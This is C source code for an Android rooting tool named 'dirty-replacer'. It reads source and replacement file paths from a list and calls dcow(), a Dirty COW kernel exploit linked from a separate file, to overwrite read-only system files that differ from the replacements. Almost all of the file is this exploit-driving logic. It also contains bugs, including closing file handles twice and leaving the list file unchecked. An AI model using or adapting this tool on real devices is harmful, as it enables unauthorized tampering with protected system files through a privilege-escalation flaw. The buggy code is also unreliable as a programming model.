/* Notice: Not much error testing is performed on this EXTREMELY dangerous rooting tool */
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<android/log.h>
#include<sys/system_properties.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty-replacer", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "dirty-replacer", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif


// This "function declaration" is from dirtycow.c which is included during compile inside Android.mk, check for reference
int dcow(const char *dst, const char *src);

//local function declarations
FILE* fopen_path(const char *path, const char *style);
int files_matched(FILE* fp1, FILE* fp2); 
int oldirtycow(); 
char * recover_filename(FILE * f);

//execution starts here
int main(int argc, const char *argv[]) {
	//This code is being designed to work with toolbox.c and dumpstate.c -- to exploit
        //it is not complete. it was not well tested!! It is only a beginning....
        LOGV("dirty-replacer beginning execution");

	//checking is done inside the cow
        if (oldirtycow()){
	   printf("Error in dirtycow\n");
        LOGV("the check --> if (olddirtycow()) returned an error.");
	}else{
	   LOGV("Returned no errors. Run the app again to test if all the patches stuck!");	
	   printf("success reported, that's a goooood, good dirty ol'cow\n");
	}

	return 0;
}
int oldirtycow(){
    //open our file list read only
    FILE* file = fopen("files.txt", "r"); /* should check the result */
    //This is an array of characters it is not a pointer.
    char line[2048];
    //holds files parts from files.txt
    char *fileArgsLeft[1024];
    char *fileArgsRight[1024];
    //Keeps track of While Loop iteration #, so we can point to the correct array
    int iFi;
    iFi=0;
    //this parses the files left / right so we can compare
    while (fgets(line, sizeof(line), file)) { /* fgets returns a null that can be useful */
        fileArgsLeft[iFi] = strtok(line, " "); /* return the characters up to the first space */
        fileArgsRight[iFi] = strtok(strtok(NULL, " "), "\n"); /* using newline character -- not handling null */
	FILE* fpLeft = fopen(fileArgsLeft[iFi], "rb");
	FILE* fpRight = fopen(fileArgsRight[iFi], "rb");
		//Test to make sure we are always working with valid file pointers
		if(fpLeft == NULL){
			printf("\n\n\n\n\n\n===>] ERROR [<===\n\n");
			printf("Can't open left file value for reading on line: %i\n",iFi+1);
			printf("..........and that's a crashed program let's get out while we can..........\n");
			LOGV("Can't open left side file value for reading on line: %i",iFi+1);
        		LOGV("Attempting to close!! CTRL C inside the adb window if it hangs!!!!!!!!!");
			if(fpLeft != NULL)				        
				fclose(fpLeft);
			if(fpRight != NULL)
			        fclose(fpRight);
			if(file != NULL)
				fclose(file);
			return 1;
		}
		//Test to make sure we are always working with valid file pointers
		if(fpRight == NULL){
			printf("\n\n\n\n\n\n===>] ERROR [<===\n\n");
			printf("Can't open right file value for reading on line: %i\n",iFi+1);
			printf("..........and that's a crashed program let's get out while we can..........\n");
			LOGV("Can't open right side file value for reading on line: %i",iFi+1);
        		LOGV("Attempting to close!! CTRL C inside the adb window if it hangs!!!!!!!!!");

			if(fpLeft != NULL)				        
				fclose(fpLeft);
			if(fpRight != NULL)
			        fclose(fpRight);
			if(file != NULL)
				fclose(file);
			return 1;
		}

	if(files_matched(fpLeft,fpRight)){
        //mo00om - let's try some cow, yeah?
	printf("Dirtycow replacing: %s with: %s\n",fileArgsLeft[iFi], fileArgsRight[iFi]);
	if (dcow(fileArgsLeft[iFi], fileArgsRight[iFi])){
		printf("cow error'd left: %s right: %s\n",fileArgsLeft[iFi], fileArgsRight[iFi]);
		printf("..........crashed trying to patch with dirtycow..........");
			LOGV("cow couldn't patch these.. left: %s right: %s\n",fileArgsLeft[iFi], fileArgsRight[iFi]);
        		LOGV("Attempting to close!! CTRL C inside the adb window if it hangs!!!!!!!!!");
			if(fpLeft != NULL)				        
				fclose(fpLeft);
			if(fpRight != NULL)
			        fclose(fpRight);
			if(file != NULL)
				fclose(file);
			return 1;
	}
	else{
		printf("Successfully (PATHCHED)\nleft: %s\n(PATHCED WITH)\nright: %s\n",fileArgsLeft[iFi], fileArgsRight[iFi]);
	}
	}
        fclose(fpLeft);
        fclose(fpRight);
        iFi++;
    }

			if(file != NULL)
				fclose(file);

	return 0;
}

int files_matched(FILE* fp1, FILE* fp2){
   int ch1, ch2;
   int isMatch;
  
      ch1 = getc(fp1);
      ch2 = getc(fp2);
      while ((ch1 != EOF) && (ch2 != EOF) && (ch1 == ch2)) {
         ch1 = getc(fp1);
         ch2 = getc(fp2);
      }
      if (ch1 == ch2){
	 isMatch=0;
         LOGV("Files are identical %s unchanged\n",recover_filename(fp1));
      }
      else if (ch1 != ch2){
	 isMatch=1;
         printf("Files NOT identical, calling the cow!\n");
      }
 
      fclose(fp1);
      fclose(fp2);
return isMatch;
}

// open a given path
FILE* fopen_path(const char *path, const char *style) {
	FILE *fp = fopen(path, style);
	if (fp == NULL) {
		printf("couldn't open file %s",path);
		exit(1);
	}
        return fp;
}
char * recover_filename(FILE * f) { 
  int fd; 
  char fd_path[1024]; 
  char * filename = malloc(1024); 

  fd = fileno(f); 
  sprintf(fd_path, "/proc/self/fd/%d", fd); 
  readlink(fd_path, filename, 1024); 

  return filename; 
} 
